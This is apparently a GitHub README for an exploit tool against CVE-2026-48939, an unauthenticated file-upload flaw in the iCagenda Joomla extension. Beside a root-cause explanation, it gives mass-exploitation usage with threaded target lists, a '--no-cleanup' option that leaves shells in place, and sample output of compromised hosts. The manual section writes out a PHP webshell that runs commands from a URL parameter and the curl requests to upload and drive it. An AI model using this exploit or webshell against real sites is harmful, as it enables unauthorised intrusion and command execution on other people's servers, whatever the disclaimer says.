<p align="center">
  <img src="https://img.shields.io/badge/python-3.8+-3776AB?style=flat-square&logo=python&logoColor=white">
  <img src="https://img.shields.io/badge/CVE-2026--48939-CC0000?style=flat-square">
  <img src="https://img.shields.io/badge/CVSS-10.0_CRITICAL-CC0000?style=flat-square">
  <img src="https://img.shields.io/badge/license-MIT-97CA00?style=flat-square">
</p>

<h3 align="center">CVE-2026-48939 — iCagenda Joomla RCE Exploit</h3>
<h4 align="center">Pre-Auth Arbitrary File Upload → PHP Code Execution</h4>

---

## Overview

**CVE-2026-48939** is a CVSS 10.0 critical vulnerability in the iCagenda events calendar extension for Joomla. The frontend event registration form's file attachment feature enforces access controls only at the view layer — not the controller — allowing unauthenticated file upload with no extension validation.

Uploaded files land directly under the web root at `/images/icagenda/frontend/attachments/` and are immediately executable as PHP.

### Affected Versions

| iCagenda Version | Status |
|---|---|
| 3.2.1 – 3.9.14 | Vulnerable |
| 4.0.0 – 4.0.7 | Vulnerable |
| 3.9.15 / 4.0.8+ | Patched |

---

## Vulnerability Mechanism

### Root Cause

The `registration.submit` controller processes file uploads without enforcing the "Registered Only" access restriction configured in the component settings. File attachments are written with their original extension without any allowlist, MIME type, or content validation.

```
View Layer   → "Registered Only" enforced (attempts to block)
Controller   → No auth check whatsoever (trivially bypassed by POST)
File Handler → No extension allowlist, no MIME check, no content scan
Destination  → Web-accessible directory → PHP executes directly
```

### Attack Flow

```
POST /index.php?option=com_icagenda&task=registration.submit
  jform[attachment] = shell.php  →  saved to /images/icagenda/frontend/attachments/

GET /images/icagenda/frontend/attachments/shell_TIMESTAMP.php?cmd=id
  → PHP executed → RCE
```

---

## Installation

```bash
git clone https://github.com/shinthink/CVE-2026-48939.git
cd CVE-2026-48939
pip install -r requirements.txt
```

---

## Usage

```bash
# Single target
python cve_2026_48939.py -t target.com

# Mass exploit
python cve_2026_48939.py -f targets.txt

# Persistent shell (no cleanup)
python cve_2026_48939.py -t target.com --no-cleanup

# Save results
python cve_2026_48939.py -f targets.txt -o rce.txt
```

### Arguments

```
  -t, --target      Single target (domain or IP)
  -f, --file        Target list, one per line
  -o, --output      Save RCE results to file
  --threads         Concurrent workers (default: 25)
  --no-cleanup      Leave shells on target
  -v, --verbose     Show detailed output
```

---

## Proof of Concept

### Exploitation

```bash
$ python cve_2026_48939.py -t target.com -v
```

```
  CVE-2026-48939 — iCagenda Joomla RCE Exploit
  CVSS 10.0 | Pre-Auth | File Upload → RCE

    [+] POST registration.submit (jform[attachment]): HTTP 200
    [+] Shell: https://target.com/images/icagenda/frontend/attachments/ic_a3f2b9c1.php

  Host     : target.com
  iCagenda : YES v4.0.5
  Vuln     : YES
  RCE      : YES
  Shell    : https://target.com/images/icagenda/frontend/attachments/ic_a3f2b9c1.php
  Output   : uid=1001(www-data) gid=1001(www-data) groups=1001(www-data)
  Time     : 3.2s
```

### Mass Exploit Output

```
  CVE-2026-48939 iCagenda RCE Exploit
  Targets: 500 | Threads: 25 | Cleanup: ON
  -------------------------------------------------------

  [RCE]  target-1.com     v4.0.5    3.2s
         uid=1001(www-data) gid=1001(www-data)
  [RCE]  target-2.com     v3.9.12   4.1s
         uid=33(www-data) gid=33(www-data)

  -------------------------------------------------------
  Total: 500 | iCagenda: 23 | RCE: 8
  -------------------------------------------------------
```

### Manual Exploitation

**Step 1 — Upload PHP webshell**

```bash
cat > shell.php << 'EOF'
<?php echo "OK|".php_uname(); system($_GET["c"]); ?>
EOF

curl -sk -X POST \
  -F "title=Event" \
  -F "jform[attachment]=@shell.php;type=application/x-php" \
  "https://target.com/index.php?option=com_icagenda&task=registration.submit"
```

**Step 2 — Execute commands**

```bash
curl -sk "https://target.com/images/icagenda/frontend/attachments/shell_TIMESTAMP.php?c=id"
```

---

## Disclaimer

> **FOR EDUCATIONAL AND AUTHORIZED TESTING PURPOSES ONLY.**
>
> This software is intended for security professionals conducting authorized penetration tests, organizations auditing their own infrastructure, and researchers studying vulnerability exploitation.
>
> Unauthorized access to computer systems is illegal and may violate:
> - United States: Computer Fraud and Abuse Act (18 U.S.C. 1030)
> - Indonesia: UU ITE Pasal 30 & 46
> - European Union: Directive 2013/40/EU
> - United Kingdom: Computer Misuse Act 1990
>
> The authors assume no liability for misuse.

---

## References

| Resource | Link |
|---|---|
| IONIX Advisory | [ionix.io/threat-center/cve-2026-48939](https://www.ionix.io/threat-center/cve-2026-48939/) |
| NVD Entry | [CVE-2026-48939](https://nvd.nist.gov/vuln/detail/CVE-2026-48939) |
| iCagenda Changelog | [icagenda.com/docs](https://www.icagenda.com/docs/changelog/icagenda-4-0-9) |

---

<p align="center">
  <sub>This project is not affiliated with iCagenda or Joomlic.</sub>
</p>
